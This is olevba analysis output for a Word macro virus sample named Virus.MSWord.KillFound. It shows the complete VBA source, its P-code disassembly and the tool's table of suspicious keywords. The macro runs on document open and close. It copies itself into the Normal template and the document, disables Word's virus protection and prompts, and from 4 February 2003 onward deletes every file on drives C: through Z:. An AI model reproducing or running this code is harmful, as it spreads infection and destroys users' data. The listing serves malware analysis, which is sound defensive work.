olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.KillFound
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Dina.cls 
in file: Virus.MSWord.KillFound - OLE stream: 'Macros/VBA/Dina'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
  On Error Resume Next
  If ActiveDocument.VBProject.VBComponents(1).Name <> "Dina" Then
     Set go = ActiveDocument.VBProject.VBComponents(1)
     saveit = True
     ElseIf NormalTemplate.VBProject.VBComponents(1).Name <> "Dina" Then
            Set go = NormalTemplate.VBProject.VBComponents(1)
  End If
  With go
    .CodeModule.deletelines 1, .CodeModule.countoflines
    .CodeModule.insertlines 1, Dina.VBProject.VBComponents(1).CodeModule.lines(1, Dina.VBProject.VBComponents(1).CodeModule.countoflines)
    .Name = "Dina"
  End With
  Options.ConfirmConversions = 0
  Options.SaveNormalPrompt = 0
  Options.VirusProtection = 0
  If saveit = True Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
  If (Day(Now()) >= 4) And (Month(Now()) = 2) And (Year(Now()) >= 2003) Then
     For k = 90 To 67 Step -1
         With Application.FileSearch
              .NewSearch
              .LookIn = Chr(k) + ":\"
              .SearchSubFolders = True
              .FileName = "*.*"
              .MatchTextExactly = False
              .FileType = msoFileTypeAllFiles
              If .Execute > 0 Then
                 For i = 1 To .FoundFiles.Count
                     Kill .FoundFiles(i)
                 Next i
              End If
         End With
     Next k
  End If
End Sub
Private Sub Document_Close()
  Document_Open
End Sub
'-----BEGIN PGP MESSAGE-----
'Version: PGP 7.0.1
'qANQR1DDDQQDAwK7okQ9K+8ZB2DJnxC2/f100uQmDHWuys000cDrvnTuSXBJ//Yi
'OuqKU/NrLfQ5bT8/ec4aamRSinTx3ZkiJxEouGxGUjjk3Q3Yl1y7jn+6VhZO6fUQ
'ZSUTc9g2md6RXxO8Lg+1O2q7b5G26hCs74VqqFRPbhd7DFNky6V7rm6vvU+GzMRG
'7yDjm+LIOFpwqtyz6BxPbZsVw8wj5NQUnmr2ZtNgRk4A+M4YCQ==
'=+0jJ
'-----END PGP MESSAGE-----
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.KillFound
' ===============================================================================
' Module streams:
' Macros/VBA/Dina - 3782 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0004 "Dina"
' 	Ne 
' 	IfBlock 
' Line #3:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set GoSub 
' Line #4:
' 	LitVarSpecial (True)
' 	St saveit 
' Line #5:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0004 "Dina"
' 	Ne 
' 	ElseIfBlock 
' Line #6:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set GoSub 
' Line #7:
' 	EndIfBlock 
' Line #8:
' 	StartWithExpr 
' 	Ld GoSub 
' 	With 
' Line #9:
' 	LitDI2 0x0001 
' 	MemLdWith CodeModule 
' 	MemLd countoflines 
' 	MemLdWith CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #10:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld Dina 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	LitDI2 0x0001 
' 	Ld Dina 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	MemLdWith CodeModule 
' 	ArgsMemCall insertlines 0x0002 
' Line #11:
' 	LitStr 0x0004 "Dina"
' 	MemStWith New 
' Line #12:
' 	EndWith 
' Line #13:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #14:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #15:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #16:
' 	Ld saveit 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' 	EndIf 
' Line #17:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0004 
' 	Ge 
' 	Paren 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0002 
' 	Eq 
' 	Paren 
' 	And 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Year 0x0001 
' 	LitDI2 0x07D3 
' 	Ge 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #18:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	LitDI2 0x005A 
' 	LitDI2 0x0043 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #19:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #20:
' 	ArgsMemCallWith NewSearch 0x0000 
' Line #21:
' 	Ld k 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0002 ":\"
' 	Add 
' 	MemStWith LookIn 
' Line #22:
' 	LitVarSpecial (True)
' 	MemStWith SearchSubFolders 
' Line #23:
' 	LitStr 0x0003 "*.*"
' 	MemStWith FileName 
' Line #24:
' 	LitVarSpecial (False)
' 	MemStWith MatchTextExactly 
' Line #25:
' 	Ld msoFileTypeAllFiles 
' 	MemStWith FileType 
' Line #26:
' 	MemLdWith Execute 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #27:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith FoundFiles 
' 	MemLd Count 
' 	For 
' Line #28:
' 	Ld i 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	ArgsCall Kill 0x0001 
' Line #29:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	EndWith 
' Line #32:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	NextVar 
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	EndSub 
' Line #35:
' 	FuncDefn (Private Sub Document_Close())
' Line #36:
' 	ArgsCall Document_Open 0x0000 
' Line #37:
' 	EndSub 
' Line #38:
' 	QuoteRem 0x0000 0x001B "-----BEGIN PGP MESSAGE-----"
' Line #39:
' 	QuoteRem 0x0000 0x0012 "Version: PGP 7.0.1"
' Line #40:
' 	QuoteRem 0x0000 0x0040 "qANQR1DDDQQDAwK7okQ9K+8ZB2DJnxC2/f100uQmDHWuys000cDrvnTuSXBJ//Yi"
' Line #41:
' 	QuoteRem 0x0000 0x0040 "OuqKU/NrLfQ5bT8/ec4aamRSinTx3ZkiJxEouGxGUjjk3Q3Yl1y7jn+6VhZO6fUQ"
' Line #42:
' 	QuoteRem 0x0000 0x0040 "ZSUTc9g2md6RXxO8Lg+1O2q7b5G26hCs74VqqFRPbhd7DFNky6V7rm6vvU+GzMRG"
' Line #43:
' 	QuoteRem 0x0000 0x0034 "7yDjm+LIOFpwqtyz6BxPbZsVw8wj5NQUnmr2ZtNgRk4A+M4YCQ=="
' Line #44:
' 	QuoteRem 0x0000 0x0005 "=+0jJ"
' Line #45:
' 	QuoteRem 0x0000 0x0019 "-----END PGP MESSAGE-----"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

